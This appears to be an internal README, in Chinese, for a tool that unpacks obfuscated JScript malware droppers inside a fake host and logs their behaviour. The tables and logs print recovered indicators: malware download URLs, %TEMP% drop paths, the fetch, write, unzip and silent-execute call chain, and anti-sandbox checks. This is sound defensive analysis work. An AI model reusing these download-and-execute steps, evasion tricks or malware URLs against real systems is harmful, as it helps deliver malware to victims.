# 脚本虚拟沙盒 说明（L1）

> 一句话：把"变形脚本"从一堆 `\uXXXX` 转义里**还原成可读的真实行为**，
> 全程不碰真实系统、不联网、不落地，实测 **31–78 毫秒**。

---

## 一、为什么静态特征对这类样本必然全瞎

样本集里那两个 800 KB 的 `.js`，文件开头是：

```
(0,this)["\u0065"+"\u0076\u0061\u006c"]("\u0028\u0030\u002c\u0074\u0068\u0069\u0073...
```

连 `eval` 这个词本身都是 `\u0065\u0076\u0061\u006c` 转义出来的。
所以常规静态特征（搜 `eval(`、`fromCharCode`、`ActiveXObject`、URL 正则）**在这个文件上命中数为 0**——
不是漏报，是**根本没东西可搜**。

这正是火绒那份 PDF 说的"变形脚本"，也是它为什么必须做**虚拟执行**：
不把脚本跑起来，你永远拿不到被藏起来的真实数据。

## 二、四步流水线

```
变形 .js（822 KB）
   │
   │ ① 静态剥壳（永不执行，纯字符串运算）
   │     · 只对「字符串字面量内部」做 JS 转义解码
   │       （关键：整篇解码会把字面量本身拆断——第一版原型就栽在这）
   │     · 反复做「相邻字面量拼接折叠」到不动点
   │     · 逐层剥 (0,this)["eval"]("<字面量>") 外壳
   ▼
解密器层（22,650 字符）—— 纯字符串算术，没有任何系统调用
   │
   │ ② 受控执行，拿回真实代码
   │     · 把结尾那句  wi510[no904](ip973);   （原意 = eval(解密结果)）
   │       改写成        __OUT__ = ip973;
   │     · 交给 js_vm.exe 在受控 JScript 里跑，读回 __OUT__
   ▼
真实代码（9,333 字符）—— 完整的下载器/加载器
   │
   │ ③ 虚拟执行，记行为
   │     · 把还原出来的代码**再放回 js_vm 跑一遍**
   │     · 它去调 WScript.Shell.Run / XMLHTTP / ADODB.Stream / FSO……
   │       全部落到虚拟宿主上，只记一行，什么都不真做
   ▼
行为日志（★执行请求 / ★网络请求 / ★落地文件 / ★写注册表）
   │
   │ ④ 解码取证
   │     · 解开剩下的 \uXXXX 字面量，抽 IOC
   ▼
中文报告：下载地址 / 落地路径 / COM 组件 / 行为代码行 / 反沙箱手法
```

## 三、实测结果（本轮真跑，不是设计稿）

| 样本 | 原始 | 剥壳层数 | ② 解密器耗时 | 还原长度 | ③ 虚拟执行耗时 |
|---|---|---|---|---|---|
| `ff587b56…4966.js` | 822,422 字符 | 822K → 136K → 22,650 | **62 ms** | 9,333 字符 | **31 ms** |
| `9ed811ef…f276.js` | 809,198 字符 | 809K → 133K → 22,119 | **63 ms** | 9,378 字符 | **47 ms** |

还原出来的真实行为（两个样本同族、不同 C2）：

| | `ff587b56…` | `9ed811ef…` |
|---|---|---|
| 下载地址 | `https://massagebycath.com.au/Zoom.zip` | `https://abilityindisabilityindia.org/wewe.exe` |
| 落地 | `%TEMP%\3c11.zip` → `%TEMP%\3c11.exe` / `.msi` | `%TEMP%\6dd3.zip` → `%TEMP%\6dd3.exe` / `.msi` |
| 网络组件 | `WinHttp.WinHttpRequest.5.1` → 失败改用 `MSXML2.ServerXMLHTTP.6.0` | 同 |
| 解压 | `Shell.Application` → `NameSpace(...).CopyHere(items, 0x14)` | 同 |
| 落地写盘 | `ADODB.Stream.Type=1; Open; Write; SaveToFile(raw,2)` | 同 |
| 执行 | `WScript.Shell.Run("\""+p+"\"")`；若是 `.msi` 则 `msiexec.exe /i "..." /qn` | 同 |
| 反沙箱 | `/wscript/i.test(WScript.FullName)` → `WScript.Interactive=false`；时间差等待循环 + `WScript.Sleep` | 同 |

虚拟执行真正抓到的**行为证据**（没有联网、没有写盘）：

```
[★COM请求] WScript.CreateObject("WScript.Shell")
[★COM请求] WScript.CreateObject("Scripting.FileSystemObject")
[★COM请求] WScript.CreateObject("WinHttp.WinHttpRequest.5.1")
[★COM请求] WScript.CreateObject("MSXML2.ServerXMLHTTP.6.0")
[★网络请求] MSXML2.ServerXMLHTTP.6.0.open("GET", "https://massagebycath.com.au/Zoom.zip", "false")
[★网络请求] MSXML2.ServerXMLHTTP.6.0.send()
```

> 注：因为我们的假网络返回"下载失败"，样本按它自己的逻辑**提前 return**，
> 后面的"写盘 → 解压 → 执行"没走到。那部分行为是从 ② 还原出来的**代码本身**读出来的
> （第 ④ 步的"行为相关代码行"），来源清楚、不是猜的。

## 四、安全设计（三层保证，且每层都有实测）

1. **不提供任何真实宿主对象**：站点只回答"这个名字不存在"。
   → WScript / FileSystemObject / XMLHTTP / ADODB 在脚本里全是空的。
2. **堵掉引擎内置的 COM 后门**：JScript 的 `ActiveXObject` / `GetObject` 是**绕开宿主站点的**
   （实测：不处理时真能创建 `Scripting.FileSystemObject` 并写文件！），
   所以用前置护栏脚本把它们覆盖掉。
3. **采信前校验护栏**：护栏函数上带唯一令牌 `__svmToken`，跑完回读一次；对不上就
   **拒绝采信结果**（退出码 6）——宁可不出结论，也不给假结论。

实测验证记录：

| 验证项 | 结果 |
|---|---|
| 自检脚本里 `new ActiveXObject('Scripting.FileSystemObject')` 并写标记文件 | **标记文件不存在**（真 COM 没被创建） |
| 自检脚本里 `x.Run('calc.exe')` | 只产生一行行为日志，**计算器没起来** |
| 尝试 `delete ActiveXObject` 后再用 | `typeof(ActiveXObject) == "undefined"` → **真身回不来** |
| 令牌篡改 | 校验失败 → 退出码 6，结果丢弃 |

> 已知的小遗憾：JScript 引擎里没有 `Object.defineProperty`，所以护栏只能是"普通赋值"，
> 没法设成只读不可删。但**删除也只是变成 undefined**，真身同样拿不回来，安全性不受影响。

## 五、已知局限（说清楚，不含糊）

- **只覆盖 JScript / WSH-JS**。VBScript（`.vbs/.vbe`）用同一套宿主换 `VBScript.dll` 即可支持，属下一步。
- **HTA** 是 HTML+脚本，需要浏览器级环境，本工具不适用，建议交给 WSB。
- **PowerShell** 仍走已有的"脚本块审计"，不在这里。
- 样本若使用我们**没有fake 的成员**，会抛异常；异常文本与行号会被记录下来（这本身也是线索），
  必要时把成员补进虚拟宿主即可。
- 我们**不模拟"成功下载"**（故意不伪造网络成功），所以看不到"下载成功之后"的完整链条；
  那部分从还原出来的代码读取。

## 六、用法

```bat
:: 单个样本（推荐用桌面上的启动器）
还原脚本样本.cmd "C:\样本\某样本.js" "C:\输出目录"

:: 或直接
python unbox_js.py "<样本路径>" "<工作目录>" --run-seconds 15
```

产出（都在 <工作目录> 下）：

| 文件 | 内容 |
|---|---|
| `report.txt` | **中文报告**（下载地址、落地路径、COM 组件、行为代码行、反沙箱手法） |
| `recovered_full.txt` | ② 还原出来的**真实代码**（原始形态） |
| `recovered_decoded.js` | ④ 解码后的真实代码（`\uXXXX` 已解开，可读） |
| `behavior.txt` | ③ 虚拟执行记下来的**行为日志** |
| `layer_final.js` / `layer_rewritten.js` | ①剥壳结果 / ②改写后的可执行层 |

## 七、对应火绒那份资料的哪几点

| 火绒 PDF 里的说法 | 我们这里的实现 | 差异 |
|---|---|---|
| 把脚本问题转化为行为问题 | ③ 虚拟执行 + 行为日志 | 我们不做 PE 行为复用，直接出可读行为证据 |
| 不需要引导操作系统，所以快 | 纯进程内 JScript（`jscript.dll`） | 一致；实测 31–78 ms |
| 脚本用 `\uXXXX`/拼接/自定义解密器藏数据 | ① 静态剥壳 + ② 受控跑解密器 | **一致，本轮的真正突破点** |
| 反沙箱：`/wscript/i.test(WScript.FullName)` 等 | ④ 专门识别并列出这类手法 | 一致（两个样本都命中） |
| 虚拟 Windows 内核 + 虚拟 WScript.exe（高保真） | 只仿真"脚本被用到的那几十个 API" | **火绒更强**；我们的取巧之处是只要求"骗过下载器" |
| 不依赖开源解释器（防穿透） | 只依赖 Windows 自带 `jscript.dll` | 一致（不用 QuickJS/V8 之类） |
